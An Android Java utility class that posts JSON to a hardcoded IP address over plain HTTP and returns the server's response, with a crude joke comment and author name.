package com.inet.android.request;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URISyntaxException;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.ParseException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHeader;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import android.content.Context;

import com.inet.android.utils.Logging;

/**
 * Class idi na yuh
 * @author johny homicide
 *
 */
public class Caller {
	private final static String LOG_TAG = "Caller";
	static Context mContext;

	/**
	 * Performs HTTP POST
	 * @throws IOException 
	 * @throws ParseException 
	 */
	public static String doMake(String postRequest, String addition, Context context) throws IOException{
		String data = null;
		mContext = context;
	
		// Create HttpClient и PostHandler
		HttpClient httpclient = new DefaultHttpClient();
		URI uri = null;
		HttpPost httppost = null;
		try {
			uri = new URI("http://188.226.208.100/" + addition);
			Logging.doLog(LOG_TAG, uri.toASCIIString());
			httppost = new HttpPost(uri);
			httppost.setHeader("Accept", "application/json");
			httppost.setHeader(HTTP.CONTENT_TYPE, "application/json");
		} catch (URISyntaxException e1) {
			Logging.doLog(LOG_TAG, "bad in uri");
			e1.printStackTrace();
		}
		
		Logging.doLog(LOG_TAG, "request: " + postRequest, "request: " + postRequest);

			StringEntity se = new StringEntity(postRequest, HTTP.UTF_8);
			se.setContentType("application/json");
			se.setContentEncoding(new BasicHeader(HTTP.CONTENT_TYPE, "application/json"));
			se.setContentType("");
			httppost.setEntity(se);
			
			Logging.doLog(LOG_TAG, "doMake: " + EntityUtils.toString(httppost.getEntity()), 
					"doMake: " + EntityUtils.toString(httppost.getEntity()));

			// Выполним запрос
			HttpResponse response = httpclient.execute(httppost);

			if (response != null) {
				try {							
					HttpEntity httpEntity = response.getEntity();
							
					if(httpEntity != null){
						InputStream inputStream = httpEntity.getContent();
						data = convertStreamToString(inputStream);
					}
							
					Logging.doLog(LOG_TAG, "response: " + data, "response: " + data);

					if (data.indexOf("code") == -1) {
						Logging.doLog(LOG_TAG, "something wrong in the answer", 
								"something wrong in the answer");
											
						return null;
					}
				} catch (ParseException e) {
							e.printStackTrace();
				} catch (IOException e) {
							e.printStackTrace();
				}

			} else {
				Logging.doLog(LOG_TAG, "http response equals null", 
						"http response equals null");
			}		
		return data;
	}

	private static String convertStreamToString(InputStream inputStream) {
		BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
		StringBuilder sb = new StringBuilder();

		String line = null;
		try {
			while ((line = reader.readLine()) != null) {
				sb.append(line + "\n");
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				inputStream.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return sb.toString();
	}
}
